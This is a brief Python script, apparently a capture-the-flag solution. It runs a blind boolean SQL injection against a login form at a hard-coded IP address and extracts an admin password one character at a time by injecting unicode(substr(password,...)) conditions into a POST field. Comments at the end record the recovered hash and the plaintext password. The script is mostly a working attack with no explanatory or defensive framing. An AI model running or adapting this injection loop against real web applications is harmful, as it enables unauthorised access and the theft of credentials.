import requests


flag=""

for i in range(1,32):
	counter=30
	while True : 
		dataa={"life" : "LordCommander' and role='admin' and unicode(substr(password,{},1))={} -- -".format(i,counter),"soul" : "troll"}
		a=requests.post("http://163.172.176.29/WALL/index.php",data=dataa)
		if "Wrong" in a.content:
			flag+=chr(counter)
			print "flag : "+flag
			break
		counter+=1
		
#0e565041023046045310587974628079
#0e565041023046045310587974628079:MyWatchIsOver

